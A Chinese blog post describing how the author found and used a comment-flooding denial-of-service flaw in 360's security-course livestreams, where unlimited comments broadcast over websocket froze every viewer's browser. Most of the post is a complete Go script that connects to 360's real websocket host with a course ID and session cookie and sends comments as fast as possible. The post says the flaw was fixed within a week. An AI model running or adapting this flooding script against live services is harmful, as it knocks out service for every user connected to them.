---
title: 利用360直播课评论区对用户浏览器dos攻击
tags:
  - coding
  - dos
categories:
  - coding
date: 2020-05-29 14:01:45
---

前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错

对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数50次限制，但是评论总数没有限制

并且，后端性能非常好，能够即时处理所有评论并通过websocket发送给所有直播课的听众

用户的浏览器效率比较低，无法及时处理后端返回的所有评论，从而导致浏览器卡死，如此只需要一个用户不断发送评论包，所有用户都会受到dos攻击

评论代码如下：

```golang
package main

import (
	"flag"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"time"

	"github.com/gorilla/websocket"
)

var addr = flag.String("addr", "trans.college.360.cn", "http service address")

func main() {
	flag.Parse()
	log.SetFlags(0)

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	u := url.URL{
		Scheme: "wss", 
		Host: *addr, 
		Path: "/ws", 
		RawQuery: "live_course_id=10114"
	}
	log.Printf("connecting to %s", u.String())


	header := make(http.Header)
	header["Origin"] = []string{"https://admin.college.360.cn"}
	header["User-Agent"] = []string{"Chrome/80.0.3987.122"}
	header["Cookie"] = []string{"your cookie"}

	dialer := websocket.DefaultDialer
	dialer.EnableCompression = true
	c, _, err := dialer.Dial(u.String(), header)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()

	done := make(chan struct{})

	go func() {
		defer close(done)
		for {
			_, message, err := c.ReadMessage()
			if err != nil {
				log.Println("read:", err)
				return
			}
			log.Printf("recv: %s", message)
		}
	}()

	ticker := time.NewTicker(1)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			err := c.WriteMessage(websocket.TextMessage, []byte(
					"{\"cmd\":\"newMessage\",\"message\":\"感谢360\"}"
				))
			if err != nil {
				log.Println("write:", err)
				return
			}
		case <-interrupt:
			log.Println("interrupt")
			err := c.WriteMessage(
				websocket.CloseMessage, 
				websocket.FormatCloseMessage(
					websocket.CloseNormalClosure, ""
				)
			)
			if err != nil {
				log.Println("write close:", err)
				return
			}
			select {
			case <-done:
			case <-time.After(time.Second):
			}
			return
		}
	}
}
```

可能是360也发现这个dos了，过了不到一个周便修复了，增加了评论速率的限制
